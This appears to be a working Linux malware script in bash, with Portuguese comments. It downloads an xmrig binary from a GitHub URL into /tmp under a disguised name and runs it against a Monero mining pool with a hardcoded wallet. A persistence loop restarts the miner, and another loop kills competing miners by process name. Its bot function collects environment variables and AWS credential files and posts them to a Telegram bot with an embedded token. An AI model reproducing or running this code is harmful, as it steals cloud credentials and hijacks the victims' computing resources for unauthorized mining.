#!//bin/bash




url='https://github.com/atilabyte/bash/raw/refs/heads/master/xmrig'
killall='https://busybox.net/downloads/binaries/1.16.1/busybox-x86_64'











execute_vkzmn() {

chmod_ok=0
chmod 777 /tmp/vkzmn
if (( $? )) ; then
# erro  em aplica  a permissao no vkzmn
exit
else 
chmod_ok=1
fi ; 
if  (( $chmod_ok ))  ; then
                                                
echo executei o xmrig

cd /tmp ; ./vkzmn  --tls   --url  pool.supportxmr.com:9000  --user  4Ary8uo817nZAjKXPtgRLf1XUVn1KXUp5WDBUrjDfctwGpirSoxKqBNRnRsgp7ha5vGxXD2u8maGMTezRzjaXrizTp2xYFy --pass atila  --donate-level 1

 
fi ;
}








###############
check_wget() {
command -v wget 
if (( $? )) ; then #if last err not  0  wget not found
check_curl
else
echo  wget encontrado
wget $url -O /tmp/vkzmn
fi;
}

check_curl() {
command -v  curl
if (( $? )) ; then 
# curl not found 
exit
else 
# usando curl
curl -L  $url -o /tmp/vkzmn
check_file
fi;
}





check_file() {

vkzmn_in_tmp=0
ls /tmp/vkzmn  
if (( $? )) ; then
# vkzmn nao esta em //tmp
check_wget
else 
vkzmn_in_tmp=1
fi ;
if (( $vkzmn_in_tmp )) ; then 
# vkzmn ja esta em //tmp
magic 
fi;

}


magic() {  #check  if file is elf
hash=0
# checando  a integridade do arquivo
command -v  md5sum
 if (( $?  )) ; then
# md5sum nao encontrado
exit #use  od 
fi;
md5=$( md5sum /tmp/vkzmn )
for  m  in $md5 ; do  
if [[ $m = 'e1b3e738928012a07dfce8659b3ff31d' ]] ; then #hash md5 of   xmrig
hash=1
fi;
done
if (( $hash )) ; then
# binario conhecido
execute_vkzmn
fi ;
if  [  $hash  -eq   0  ]   ; then 
# binario  desconecido
check_wget
fi ; 
}
# -------------------------------------------
proc() {
true=1000
while true ; do

vkzmn_ok=0
dir_proc=$( ls  /proc )
for  pid  in   $dir_proc ; do
if  ((  $pid  >  0  )) ; then #get only numbers
comm=$( cat  /proc/$pid/comm )
for  cc in  $comm ; do
if [ $cc  =  "vkzmn" ] ; then
vkzmn_ok=$true
fi ; 
done
fi; 
done
if   [  $vkzmn_ok   -eq    $true   ]  ; then
echo  vkzmn_ok
else 
echo  vkzmn_not_ok
check_file   
fi ; 

sleep  60

done

} 


###############################
pg() {

vkzmn_ok=1
pgrep=0
command -v pgrep  
if (( $? )) ; then #if last err not 0 pgrep not instaled
echo pgrep not instaled
proc
else 
pgrep=1
fi ; 
if [ $pgrep -eq 1 ]  ; then
pgrep  vkzmn 
if (( $? )) ; then
vkzmn_ok=0
else 
vkzmn_ok=1
fi;
if [  $vkzmn_ok   -eq  0  ]  ; then
echo vkzmn nao  esta em execucao
check_file
fi;
fi; 
}
#################################
init() {
while  true ; do
sleep   1
pg
sleep 1 
done
}

#my_killall
################3
 

#implement  kill agent

#xmrig  xmrig1 xmrig2 lolMiner lolminer bzminer  SRBMiner-MULTI nokillme  xmrig-Daemon  miniZ cpuMinerTermux  cpuminer-sse2 

my_killall(){


while  true ; do



proc_dir=$(ls /proc/)

for  pid in $proc_dir ; do

if (( pid > 0 )) ; then

procs=$(cat  /proc/$pid/comm)

if  [[ $procs  = 'xmrig'  ]] ; then 
kill -9  $pid
if [[ $procs =   'xmrig1' ]] ; then 
kill -9   $pid
if  [[ $procs =  'xmrig2' ]] ; then  
kill  -9 $pid
if   [[  $procs =  'lolMiner' ]] ; then 
kill -9  $pid
if [[ $procs =  'lolminer' ]] ; then
kill -9  $pid 
if   [[ $procs =  'bzminer' ]] ; then
kill -9  $pid
if [[ $procs =  'SRBMiner-MULTI' ]] ; then
kill -9 $pid
if [[ $procs = 'nokillme' ]] ; then 
kill -9 $pid
if  [[ $procs = 'xmrig-Daemon' ]] ; then
kill -9  $pid
if  [[ $procs  = 'miniZ' ]] ; then 
kill -9 $pid
if [[ $procs = 'cpuMinerTermux' ]] ; then
kill -9 $pid
if [[ $procs  = 'cpuminer-sse2' ]] ; then
kill -9 $pid


fi;
fi;
fi;
fi;
fi;
fi;
fi;
fi;
fi;
fi;
fi;
fi;


fi;

done

sleep  60

done #while
}




#bot
#########



bot() {

tgram_ok=0

secrets=$( env  ;  cd  $HOME/.aws ; cat * ) #get env and aws key

curl --max-time  1  -XPOST https://api.telegram.org/bot7975585705:AAEhpsmGaok-PDwktP3k83WDI-sF7OdS7o4/sendMessage  -H  "Content-Type: application/json" -d '{"chat_id": "7127446120" , "text": "'"$secrets"'" }'

c=$( $? )


if (( $? )) ; then

tgram_ok=1

fi

while (( $tgram_ok  )) ; do

echo   erro  em envia  as secrets

exit

done

echo  secrets enviadas  


}

 




bot 
 
my_killall  
 
init 















